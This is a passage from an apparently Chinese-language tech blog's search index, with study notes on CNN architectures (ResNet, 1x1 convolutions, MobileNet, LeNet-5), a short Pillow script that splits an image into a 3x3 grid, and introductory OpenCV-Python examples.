","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:8:3","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"残差网络(ResNets) 残差网络（Residual Networks）是一种卷积神经网络，其内部使用了跳跃连接，由大量的残差块组成，这缓解了深度神经网络中增加深度带来的梯度消失和梯度爆炸问题，由此可以利用残差网络训练很深很深的网络。 https://blog.csdn.net/qq_30093417/article/details/121108090 ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:9:0","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"残差(residual) “残差在数理统计中是指实际观察值与估计值（拟合值）之间的差。” “如果回归模型正确的话， 我们可以将残差看作误差的观测值。” ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:9:1","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"残差块（Residual block） 把某层的输入跳跃连接到下一层乃至更深层的激活层之前，同本层输出一起经过激活函数输出。 即ResNet无需遵循主路径，可以通过快捷路径(跳过n层)进入更深的网络： 普通网络： 残差网络： 所训练网络越深，训练误差越小。下图的残差网络由五个残差块组成，该残差网络只跳跃了一层，还可跳跃多层 举例： 残差网络可以不是卷积神经网络，用全连接层也可以。当然，残差网络在被提出的论文中是用来处理图像识别问题。 ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:9:2","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"为什么残差网络会生效 残差网络解决网络退化的原理: 如果某层网络冗余，我们希望该层能够学习到一个恒等映射函数也就是h(x)=x，但是学习这样的函数很困难，但学习F(x)=0要更简单，所以通过跳跃连接可以实现h(x)=F(x)+x的学习。 残差网络解决梯度消失的原理: 多个Resnet Blocks累积起来能解决梯度消失问题。 Resnet Block = main path + skip connection ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:9:3","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"ResNet50 ResNet50由两个基本的块构成：Conv Block和Identity Block。 Conv Block：跳跃连接上有卷积操作，输入和输出维度不一样，改变图片的大小和通道数，不能串联，用于改变网络维度。 Identity Block：跳跃连接上没有卷积操作，输入和输出维度一样，不改变通道数，能串联，用于加深网络。 ResNet的各种网络结构图: 重点说明一下ResNet-50，可以看到上图中所示，ResNet-50经过了4个Block，每一个Block中分别有3，4，6，3个Bottleneck，另外网络最开始有一个卷积层，所以:3+4+6+3 * 3 + 1 = 49，加上取样层。 ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:9:4","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"初始网络 ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:10:0","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"1x1卷积核(网中网) 当1*1卷积出现时，在大多数情况下它作用是升/降特征的维度，这里的维度指的是通道数（厚度），而不改变图片的宽和高。 例子： 过滤器为1×1，这里是filter的数字是2，输入一张6×6×1的图片，然后对它做卷积，过滤器大小为1×1×1，结果相当于把这个图片乘以数字2，所以前三个单元格分别是2、4、6等等。用1×1的过滤器进行卷积，似乎用处不大，只是对输入矩阵乘以某个数字。但这仅仅是对于6×6×1的一个通道图片来说，1×1卷积效果不佳。 如果是一张6×6×32的图片，那么使用1×1过滤器进行卷积效果更好。具体来说，1×1卷积所实现的功能是遍历这36个单元格，计算左图中32个数字和过滤器中32个数字的元素积之和，然后应用ReLU非线性函数。 我们以其中一个单元为例，它是这个输入层上的某个切片，用这36个数字乘以这个输入层上1×1切片，得到一个实数，像这样把它画在输出中。 这个1×1×32过滤器中的32个数字可以这样理解，一个神经元的输入是32个数字（输入图片中左下角位置32个通道中的数字），即相同高度和宽度上某一切片上的32个数字，这32个数字具有不同通道，乘以32个权重（将过滤器中的32个数理解为权重），然后应用ReLU非线性函数，在这里输出相应的结果。 一般来说，如果过滤器不止一个，而是多个，就好像有多个输入单元，其输入内容为一个切片上所有数字，输出结果是6×6过滤器数量。 所以1×1卷积可以从根本上理解为对这32个不同的位置都应用一个全连接层，全连接层的作用是输入32个数字（过滤器数量标记为，在这36个单元上重复此过程）,输出结果是6×6×#filters（过滤器数量），以便在输入层上实施一个非平凡（non-trivial）计算。 这种方法通常称为1×1卷积，有时也被称为Network in Network 再举个例子： 假设下图左侧这是一个28×28×192的输入层，你可以使用池化层压缩它的高度和宽度，这个过程我们很清楚。但如果通道数量很大，该如何把它压缩为28×28×32维度的层呢？你可以用32个大小为1×1的过滤器，严格来讲每个过滤器大小都是1×1×192维，因为过滤器中通道数量必须与输入层中通道的数量保持一致。但是你使用了32个过滤器，输出层为28×28×32，这就是压缩通道数（）的方法，对于池化层我只是压缩了这些层的高度和宽度。 在之后我们看到在某些网络中1×1卷积是如何压缩通道数量并减少计算的。当然如果你想保持通道数192不变，这也是可行的，1×1卷积只是添加了非线性函数，当然也可以让网络学习更复杂的函数，比如，我们再添加一层，其输入为28×28×192，输出为28×28×192。 1×1卷积层就是这样实现了一些重要功能的（doing something pretty non-trivial），它给神经网络添加了一个非线性函数，从而减少或保持输入层中的通道数量不变，当然如果你愿意，也可以增加通道数量。 1x1卷积核的作用： 1. 放缩通道数目 假如现在有一个64x64x128的输入，需要通过卷积之后生成一个32x32x128，那我们直接可以对这个输入坐卷积或者做池化，就可以改变输入的长和宽，因为输入和输出的通道数目都是相同的。 但是如果我们需要输出一个64x64x192。那这个时候就必须要用到1x1的卷积。因为input和filter都需要一样的通道数目，因此我们可以用32个1x1x192的filter去做卷积，卷积运算的结果就是28x28x32。如图所示： 2. 减少计算成本 3. 增加网络的非线性性 如果我们不用改变通道数目，也不用改变长和宽。那么1x1的卷积还有另外一个好处就是增加网络的非线性。因为从一个28x28x192-\u003e28x28x192经过一个1*1的卷积之后，使得网络可以学习到更加复杂的函数形式。这样就此增加了网络的非线性性。 对1*1卷积的一种理解是：它本质上是一个完全连接的神经网络，逐一作用于这36个位置，这个全连接网络做的事情就是接收32个数字=的输入，然后输出过滤器个数的输出值 ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:10:1","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"迁移学习（Transfer Learning）： 相比于从头训练权重，如果使用别人已经训练好的网络结构的权重，通常能够进展得相当快，用这个作为预训练。 如果任务只有一个很小的数据集,如图所示，我们可以完全使用它的权重，把前面的层都冻结； 要是有一个更大的训练集，如图所示，我们冻结更少的层，然后训练后面的层； 或者如图3所示，换成自己的网络结构。 最后，如果有大量数据，我们应该用这些网络和它的权重当做初始化，用它们来代替随机初始化，接着你可以用梯度下降训练，更新网络所有层的所有权重。 ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:10:2","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"MobileNet 是一种在低运算环境(比如手机)中也能运行的网络 MobileNet是一个轻量级卷积神经网络，它进行卷积的参数比标准卷积要少很多。 MobileNet的基本单元是深度级可分离卷积，其可以分解为两个更小的操作：depthwise convolution(深度卷积)和pointwise convolution(逐点卷积) ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:11:0","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"深度可分离卷积 深度卷积(逐通道卷积) 逐点卷积 这篇文章介绍的很清晰，推荐看看： https://zhuanlan.zhihu.com/p/165632315 标准卷积将每个卷积核与图片的所有输入通道分别进行卷积运算，而深度可分离卷积将一个标准卷积拆分为深度卷积和逐点卷积，深度卷积针对每个输入通道采用不同的卷积核，即一个卷积核对应一个输入通道，而逐点卷积其实就是普通的卷积，只不过其采用 1x1 的卷积核，其目的是实现不同通道间特征的融合以及通道方向上的升维或降维，从卷积的结果上看二者差别不大，但深度可分离卷积的运算量要远远低于标准卷积的运算量。 以输入特征层为 M∗N∗16，输出 32 通道为例，卷积核尺寸为 33，在标准卷积情况下计算量为 M∗N∗16∗3∗3∗32(M∗N∗4608)，而在深度可分离卷积情况下计算量（M∗N∗656）为深度卷积的计算量 M∗N∗16∗3∗3 加上逐点卷积的计算量:M∗N∗16∗1∗1*∗32[28]，可以看到计算量大大减少了，随着网络的加深，这种卷积的计算优势会更加明显。 ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:11:1","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"MobileNet架构 MobileNetV2的变化： ● 在架构中添加残差连接(有助于高效向后传播) ● 在深度卷积核逐点卷积之前添加一个扩展层（在V2中，我们将扩展层+深度卷积+投影称为区块2，并重复多次利用区块2） ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:11:2","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"参考 https://blog.csdn.net/qq_42363032/article/details/108180740 吴恩达深度学习课程 https://aistudio.csdn.net/62e38a7ecd38997446774cc7.html https://www.cnblogs.com/wuliytTaotao/p/9560205.html https://zsweety.blog.csdn.net/article/details/81985082 https://blog.csdn.net/amusi1994/article/details/81091145 https://blog.csdn.net/qq_42859149/article/details/119904365 https://blog.csdn.net/qq_30093417/article/details/121108090 ","date":"2022-07-30","objectID":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/:12:0","tags":["卷积神经网络","CNN","深度学习"],"title":"卷积神经网络(CNN)学习","uri":"/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-cnn-%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":" 简单读一下经典网络模型之LeNet-5，建议重点读第二章 LeNet-5是LeNet的最终稳定版本，具有以下特点： 所有卷积核大小均为5x5，步长为1； 所有池化方法为平均池化； 所有激活函数采用Sigmoid ","date":"2022-07-29","objectID":"/%E7%BB%8F%E5%85%B8%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E4%BB%8B%E7%BB%8D-lenet-5/:0:0","tags":["LeNet-5","CNN","深度学习"],"title":"经典网络模型介绍-LeNet-5","uri":"/%E7%BB%8F%E5%85%B8%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E4%BB%8B%E7%BB%8D-lenet-5/"},{"categories":["AI"],"content":"1.输入层 输入图像的尺寸统一归一化为32x32. ","date":"2022-07-29","objectID":"/%E7%BB%8F%E5%85%B8%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E4%BB%8B%E7%BB%8D-lenet-5/:0:1","tags":["LeNet-5","CNN","深度学习"],"title":"经典网络模型介绍-LeNet-5","uri":"/%E7%BB%8F%E5%85%B8%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E4%BB%8B%E7%BB%8D-lenet-5/"},{"categories":["AI"],"content":"2.C1层：第一个卷积层 输入图片大小：32x32 卷积核大小：5x5，步长1，无填充 卷积核种类：6 输出特征图大小：28x28 32-5+1=28 神经元数量：28x28x6=4704 可训练参数：（5x5+1）x6=156 其中，1为偏置参数 连接数（和输入层的连接数）：（5x5+1）x6x28x28=122304 ","date":"2022-07-29","objectID":"/%E7%BB%8F%E5%85%B8%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E4%BB%8B%E7%BB%8D-lenet-5/:0:2","tags":["LeNet-5","CNN","深度学习"],"title":"经典网络模型介绍-LeNet-5","uri":"/%E7%BB%8F%E5%85%B8%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E4%BB%8B%E7%BB%8D-lenet-5/"},{"categories":["AI"],"content":"3.S2层-池化层（下采样层） 输入特征图大小：28x28 采样区域：2x2 采样方式：4个输入相加，乘以一个可训练参数，再加上一个可训练偏置。结果通过sigmoid函数。 采样种类：6 输出特征图大小：14x14 神经元数量：14x14x6 连接数（和C1层连接）：（2x2+1）x6x14x14 S2中每个特征图的大小是C1中特征图大小的1/4. ","date":"2022-07-29","objectID":"/%E7%BB%8F%E5%85%B8%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E4%BB%8B%E7%BB%8D-lenet-5/:0:3","tags":["LeNet-5","CNN","深度学习"],"title":"经典网络模型介绍-LeNet-5","uri":"/%E7%BB%8F%E5%85%B8%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E4%BB%8B%E7%BB%8D-lenet-5/"},{"categories":["AI"],"content":"4.C3层-第二个卷积层 输入：S2中所有6个或者几个特征图组合 卷积核大小：5x5 卷积核种类：16 输出特征图大小：10x10 14-5+1=10 C3中的每个特征图是连接到S2中的所有6个或者几个特征图的，表示本层的特征图是上一层提取到的特征图的不同组合。存在的一个方式是：C3的前6个特征图以S2中3个相邻的特征图子集作为输入。接下来6个特征图以S2中4个相邻特征图自己为输入。然后的3个以不相邻的4个特征图子集作为输入。最后一个将S2中所有特征图作为输入。输出的16个通道并没有与输入的每个通道相连。 这样设计的初衷有两个： 1.减小计算量； 2.打破对称性。 现在的网络设计中，很少会遵循这样的设计原则。 可训练参数：6x（3x5x5+1）+6x（4x5x5+1）+3x（4x5x5+1）+1x（6x5x5+1）=1516 连接数：10x10x1516=151600 ","date":"2022-07-29","objectID":"/%E7%BB%8F%E5%85%B8%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E4%BB%8B%E7%BB%8D-lenet-5/:0:4","tags":["LeNet-5","CNN","深度学习"],"title":"经典网络模型介绍-LeNet-5","uri":"/%E7%BB%8F%E5%85%B8%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E4%BB%8B%E7%BB%8D-lenet-5/"},{"categories":["AI"],"content":"5.S4层-池化层（下采样层） 输入：10x10 采样区域：2x2 采样方式：4个输入相加，乘以一个可训练参数，再加上一个可训练偏置。结果通过sigmoid函数。 采样种类：16 输出特征图大小：5x5 神经元数量：5x5x16=400 连接数：（2x2+1）x400=2000 S4中每个特征图的大小是C3特征图大小的1/4 ","date":"2022-07-29","objectID":"/%E7%BB%8F%E5%85%B8%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E4%BB%8B%E7%BB%8D-lenet-5/:0:5","tags":["LeNet-5","CNN","深度学习"],"title":"经典网络模型介绍-LeNet-5","uri":"/%E7%BB%8F%E5%85%B8%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E4%BB%8B%E7%BB%8D-lenet-5/"},{"categories":["AI"],"content":"6.C5层-第三个卷积层 输入：5x5，即S4层的全部16个单元特征图（与S4全相连） 卷积核大小：5x5 卷积核种类：120 输出特征图大小：1x1 （5-5+1） 可训练参数：120x（16x5x5+1）=48120 连接数：1x1x48120=48120 C5层是一个卷积层。由于S4层的16个图的大小为5x5，与卷积核的大小相同，所以卷积后形成的图的大小为1x1。这里形成120个卷积结果。每个都与上一层的16个图相连。所以共有（5x5x16+1）x120=48120个连接。 ","date":"2022-07-29","objectID":"/%E7%BB%8F%E5%85%B8%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E4%BB%8B%E7%BB%8D-lenet-5/:0:6","tags":["LeNet-5","CNN","深度学习"],"title":"经典网络模型介绍-LeNet-5","uri":"/%E7%BB%8F%E5%85%B8%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E4%BB%8B%E7%BB%8D-lenet-5/"},{"categories":["AI"],"content":"7.F6层-全连接层 输入：120维向量 输出：84维向量 计算方式：计算输入向量和权重向量之间的点积，再加上一个偏置，结果通过sigmoid函数输出。 可训练参数：84x（120+1）=10164 ","date":"2022-07-29","objectID":"/%E7%BB%8F%E5%85%B8%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E4%BB%8B%E7%BB%8D-lenet-5/:0:7","tags":["LeNet-5","CNN","深度学习"],"title":"经典网络模型介绍-LeNet-5","uri":"/%E7%BB%8F%E5%85%B8%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E4%BB%8B%E7%BB%8D-lenet-5/"},{"categories":["AI"],"content":"8.输出层-全连接层 输入：84维向量 输出：10维向量 可训练参数：84x10，其中10就是分类的类别数。一共有10个节点，分别代表数字0到9，且如果节点i的值为0，则网络识别的结果是数字i。采用的是径向基函数（RBF）的网络连接方式。假设x是上一层的输入，y是RBF的输出，则RBF输出的计算方式是： LeNet5的缺点： 输入图像太小，数据不足，在早期并没有在除手写数字识别之外的其他计算机视觉任务上取得大的突破。 原文链接：https://blog.csdn.net/Tangguoseo/article/details/125283431 ","date":"2022-07-29","objectID":"/%E7%BB%8F%E5%85%B8%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E4%BB%8B%E7%BB%8D-lenet-5/:0:8","tags":["LeNet-5","CNN","深度学习"],"title":"经典网络模型介绍-LeNet-5","uri":"/%E7%BB%8F%E5%85%B8%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E4%BB%8B%E7%BB%8D-lenet-5/"},{"categories":["Python"],"content":" 看到一个好玩的方式，学习一下 ","date":"2022-07-17","objectID":"/pil%E5%B0%86%E5%9B%BE%E7%89%87%E5%88%87%E5%88%86%E4%B8%BA%E4%B9%9D%E5%AE%AB%E6%A0%BC/:0:0","tags":["PIL","Pillow"],"title":"PIL将图片切分为九宫格","uri":"/pil%E5%B0%86%E5%9B%BE%E7%89%87%E5%88%87%E5%88%86%E4%B8%BA%E4%B9%9D%E5%AE%AB%E6%A0%BC/"},{"categories":["Python"],"content":"思路 读取图片-\u003e填充图片为正方形(fill_image函数)-\u003e将图片切分为9张(cut_image函数)-\u003e保存图片(save_image)-\u003eover ","date":"2022-07-17","objectID":"/pil%E5%B0%86%E5%9B%BE%E7%89%87%E5%88%87%E5%88%86%E4%B8%BA%E4%B9%9D%E5%AE%AB%E6%A0%BC/:1:0","tags":["PIL","Pillow"],"title":"PIL将图片切分为九宫格","uri":"/pil%E5%B0%86%E5%9B%BE%E7%89%87%E5%88%87%E5%88%86%E4%B8%BA%E4%B9%9D%E5%AE%AB%E6%A0%BC/"},{"categories":["Python"],"content":"代码 from PIL import Image import sys # 将图片填充为正方形 def fill_image(image): width, height = image.size # 选取长和宽中较大值作为新图片的宽 new_image_length = width if width \u003e height else height # 生成新图片[白底] new_image = Image.new(image.mode, (new_image_length, new_image_length), color='white') # 将之前的图粘贴在新图上，居中 if width \u003e height: # 原图宽大于高，则填充图片的竖直维度 # (x,y)二元组表示粘贴上图相对下图的起始位置 new_image.paste(image, (0, int((new_image_length - height) / 2))) else: new_image.paste(image, (int((new_image_length - width) / 2), 0)) return new_image # 切图 def cut_image(image): width, height = image.size item_width = int(width / 3) box_list = [] # (left, upper, right, lower) for i in range(0, 3): # 两重循环，生成9张图片基于原图的位置 for j in range(0, 3): # print((i*item_width,j*item_width,(i+1)*item_width,(j+1)*item_width)) box = (j * item_width, i * item_width, (j + 1) * item_width, (i + 1) * item_width) box_list.append(box) image_list = [image.crop(box) for box in box_list] return image_list # 保存 def save_images(image_list): index = 1 for image in image_list: image.save(str(index) + '.jpg') index += 1 if __name__ == '__main__': image_path = \"img/mcat_jpg.jpg\" img = Image.open(image_path) # image.show() image = fill_image(img) image_list = cut_image(image) # save_images(image_list) ","date":"2022-07-17","objectID":"/pil%E5%B0%86%E5%9B%BE%E7%89%87%E5%88%87%E5%88%86%E4%B8%BA%E4%B9%9D%E5%AE%AB%E6%A0%BC/:2:0","tags":["PIL","Pillow"],"title":"PIL将图片切分为九宫格","uri":"/pil%E5%B0%86%E5%9B%BE%E7%89%87%E5%88%87%E5%88%86%E4%B8%BA%E4%B9%9D%E5%AE%AB%E6%A0%BC/"},{"categories":["Python"],"content":" 图像处理，怎么能不学OpenCV呢 ","date":"2022-07-17","objectID":"/python-opencv%E5%BA%93/:0:0","tags":["OpenCV","图像处理","Python基础"],"title":"Python OpenCV库","uri":"/python-opencv%E5%BA%93/"},{"categories":["Python"],"content":"前言 OpenCV-Python使用Numpy，这是一个高度优化的数据库操作库，具有MATLAB风格的语法。所有OpenCV数组结构都转换为Numpy数组。这也使得与使用Numpy的其他库（如SciPy和Matplotlib）集成更容易。 OpenCV依赖一些库，比如Numpy，自行安装。 OpenCV应用领域： 1、计算机视觉领域方向 2、人机互动 3、物体识别 4、图像分割 5、人脸识别 6、动作识别 7、运动跟踪 8、机器人 9、运动分析 10、机器视觉 11、结构分析 12、汽车安全驾驶 ","date":"2022-07-17","objectID":"/python-opencv%E5%BA%93/:1:0","tags":["OpenCV","图像处理","Python基础"],"title":"Python OpenCV库","uri":"/python-opencv%E5%BA%93/"},{"categories":["Python"],"content":"安装： # pip3 install -i https://pypi.tuna.tsinghua.edu.cn/simple opencv-python conda install -c conda-forge opencv 关于M1下安装请看：https://blog.csdn.net/jjw_zyfx/article/details/119851647 ","date":"2022-07-17","objectID":"/python-opencv%E5%BA%93/:2:0","tags":["OpenCV","图像处理","Python基础"],"title":"Python OpenCV库","uri":"/python-opencv%E5%BA%93/"},{"categories":["Python"],"content":"读取操作 import cv2 # 打开 \u0026 显示 im = cv2.imread(\"./mcat_jpg.jpg\") # 读取的图像直接表示ndarray类型的三维矩阵，彩色图片的维度是(h,w,c) cv2.imshow(\"image\", im) # 显示图片 cv2.waitKey(5) # 需配合cv2.waitKey()才能显示 # 保存图片：cv2.imwrite(filename,image) cv2.imwrite(\"mcat_cv.jpg\", im) # 用cv2打开的彩色三通道的通道顺序是BGR，而不是RGB。 # 可以使用split()和merge()方法实现通道转换 im3 = cv2.imread(\"./mcat_jpg.jpg\") b,g,r=cv2.split(im3) im4=cv2.merge((r,g,b)) cv2.imshow('ImWindow',im4) cv2.waitKey() PIL库和opencv库在读取图片上的差异： opencv：图片的通道顺序为BGR，显示的尺寸为（高/行数，宽/列数，通道数） PIL：通道顺序为RGB，显示的尺寸为（宽，高） ","date":"2022-07-17","objectID":"/python-opencv%E5%BA%93/:3:0","tags":["OpenCV","图像处理","Python基础"],"title":"Python OpenCV库","uri":"/python-opencv%E5%BA%93/"},{"categories":["Python"],"content":"获取并修改图像中的像素点 import numpy as np import cv2 as cv img = cv.imread('1.jpg') # 获取某个像素点的值 px = img[100,100] # 仅获取蓝色通道的强度值 blue = img[100,100,0] # 修改某个位置的像素值 img[100,100] = [255,255,255] ","date":"2022-07-17","objectID":"/python-opencv%E5%BA%93/:4:0","tags":["OpenCV","图像处理","Python基础"],"title":"Python OpenCV库","uri":"/python-opencv%E5%BA%93/"},{"categories":["Python"],"content":"获取图像属性 ","date":"2022-07-17","objectID":"/python-opencv%E5%BA%93/:5:0","tags":["OpenCV","图像处理","Python基础"],"title":"Python OpenCV库","uri":"/python-opencv%E5%BA%93/"},{"categories":["Python"],"content":"图像通道的拆分与合并 # 通道拆分 b,g,r = cv.split(img) # 通道合并 img = cv.merge((b,g,r)) ","date":"2022-07-17","objectID":"/python-opencv%E5%BA%93/:6:0","tags":["OpenCV","图像处理","Python基础"],"title":"Python OpenCV库","uri":"/python-opencv%E5%BA%93/"},{"categories":["Python"],"content":"基本变换 ","date":"2022-07-17","objectID":"/python-opencv%E5%BA%93/:7:0","tags":["OpenCV","图像处理","Python基础"],"title":"Python OpenCV库","uri":"/python-opencv%E5%BA%93/"},{"categories":["Python"],"content":"图像缩放：resize() ![20220717135713](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/20220717135713.png) \"\"\" 参数： src: 输入图像对象 dsize：输出矩阵/图像的大小，为0时计算方式如下：dsize = Size(round(fxsrc.cols),round(fysrc.rows)) fx: 水平轴的缩放因子，为0时计算方式： (double)dsize.width/src.cols fy: 垂直轴的缩放因子，为0时计算方式： (double)dsize.heigh/src.rows interpolation：插值算法 cv2.INTER_NEAREST : 最近邻插值法 cv2.INTER_LINEAR 默认值，双线性插值法 cv2.INTER_AREA 基于局部像素的重采样（resampling using pixel area relation）。对于图像抽取（image decimation）来说，这可能是一个更好的方法。但如果是放大图像时，它和最近邻法的效果类似。 cv2.INTER_CUBIC 基于4x4像素邻域的3次插值法 cv2.INTER_LANCZOS4 基于8x8像素邻域的Lanczos插值 cv2.INTER_AREA 适合于图像缩小， cv2.INTER_CUBIC (slow) \u0026 cv2.INTER_LINEAR 适合于图像放大 \"\"\" import cv2 img = cv2.imread(\"./mcat_jpg.jpg\") # 读取的图像直接表示ndarray类型的三维矩阵，彩色图片的维度是(h,w,c) width = 350 height = 450 # width = int(img.shape[1] * scale_percent / 100) # 保留宽高比 # height = int(img.shape[0] * scale_percent / 100) dim = (width, height) # resize image resized = cv2.resize(img, dim, interpolation=cv2.INTER_AREA) print('Resized Dimensions : ', resized.shape) cv2.imshow(\"Resized image\", resized) cv2.waitKey(0) cv2.destroyAllWindows() ","date":"2022-07-17","objectID":"/python-opencv%E5%BA%93/:7:1","tags":["OpenCV","图像处理","Python基础"],"title":"Python OpenCV库","uri":"/python-opencv%E5%BA%93/"},{"categories":["Python"],"content":"颜色空间的转换：cv2.cvtColor() \"\"\" 参数： img: 图像对象 code： cv2.COLOR_RGB2GRAY: RGB转换到灰度模式 cv2.COLOR_RGB2HSV： RGB转换到HSV模式（hue,saturation,Value） cv2.COLOR_BGR2RGB：RGB通道转换 \"\"\" import cv2 from cv2 import COLOR_RGB2GRAY im = cv2.imread(\"./mcat_jpg.jpg\") gray=cv2.cvtColor(im,COLOR_RGB2GRAY) # RGB转换到灰度模式 cv2.imshow('gray',gray) cv2.waitKey() ","date":"2022-07-17","objectID":"/python-opencv%E5%BA%93/:7:2","tags":["OpenCV","图像处理","Python基础"],"title":"Python OpenCV库","uri":"/python-opencv%E5%BA%93/"},{"categories":["Python"],"content":"图像阈值化：cv2.threshold() 图像阈值分割是一种广泛应用的分割技术，利用图像中要提取的目标区域与其背景在灰度特性上的差异，把图像看作具有不同灰度级的两类区域(目标区域和背景区域)的组合，选取一个比较合理的阈值，以确定图像中每个像素点应该属于目标区域还是背景区域，从而产生相应的二值图像。 \"\"\" cv2.threshold (源图片, 阈值, 填充色, 